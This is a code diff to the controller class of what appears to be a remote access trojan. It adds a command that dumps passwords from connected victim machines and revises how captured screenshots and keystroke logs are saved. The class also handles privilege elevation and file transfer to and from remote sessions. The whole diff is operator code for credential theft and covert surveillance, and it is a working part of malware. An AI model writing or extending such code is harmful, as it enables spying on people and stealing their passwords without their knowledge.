@@ -22,6 +22,26 @@ class Control:
         self.logger = logging.getLogger(LOGGER_ID)
         self.es = None
 
+    def password_dump(self, password=None):
+        self.es.send_json(CLIENT_PWD, password)
+
+        self.logger.info("Please wait...")
+
+        rsp = self.es.recv_json()
+
+        if rsp["key"] == SERVER_FILE_RECV:
+            data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8")
+
+            try:
+                # try to convert to string first before running rstrip on it
+                str(data)
+                print(f"\n{str(data).rstrip()}")
+            except Exception:
+                print(f"\n{data}")
+                
+        elif rsp["key"] == ERROR:
+            self.logger.error(rsp["value"])
+
     def elevate(self):
         if self.server.get_address(self.es.socket)["is_admin"]:
             self.logger.error("Session already has admin access")
@@ -181,12 +201,16 @@ class Control:
 
             data = self.es.recvall(buffer)
 
-            file = time.strftime("%Y%m%d%H%M%S.png")
+            file = f"{os.getcwd()}{os.path.sep}{time.strftime('scrn_%Y%m%d_%H%M%S.png')}"
 
-            with open(file, "wb") as objPic:
-                objPic.write(data)
+            try:
+                with open(file, "wb") as objPic:
+                    objPic.write(data)
+            except Exception as e:
+                self.logger.error(f"Error writing to file {e}")
+                return
 
-            self.logger.info(f"Total bytes received: {os.path.getsize(file)} bytes")
+            self.logger.info(f"Total bytes received: {os.path.getsize(file)} bytes -> {file}")
         elif rsp["key"] == ERROR:
             self.logger.error(f"Failed to take screenshot: {rsp['value']}")
 
@@ -212,7 +236,16 @@ class Control:
         if rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
         elif rsp["key"] == SUCCESS:
-            print(self.es.recvall(rsp["value"]["buffer"]).decode())
+            keylog = self.es.recvall(rsp["value"]["buffer"]).decode()
+
+            try:
+                file_name = f"{os.getcwd()}{os.path.sep}{time.strftime('keylog_%Y%m%d_%H%M%S.png')}"
+                with open(file_name, "w") as _file:
+                    _file.write(keylog)
+                self.logger.info(f"Saved to {file_name}")
+            except Exception as e:
+                self.logger.error(f"Error writing to file {e}")
+                print(keylog)
 
     def receive_file(self):
         file = os.path.normpath(helper.remove_quotes(input("Target file: ")))
@@ -256,10 +289,15 @@ class Control:
         if out_file == "" or file == "":  # if the input is blank
             return
 
-        with open(file, "rb") as _file:
-            data = _file.read()
-            self.logger.info(f"File size: {len(data)}")
-            self.es.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)
+        try:
+            with open(file, "rb") as _file:
+                data = _file.read()
+                self.logger.info(f"File size: {len(data)}")
+        except Exception as e:
+            self.logger.error(f"Could not send file {e}")
+            return
+
+        self.es.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)
 
         rsp = self.es.recv_json()
 
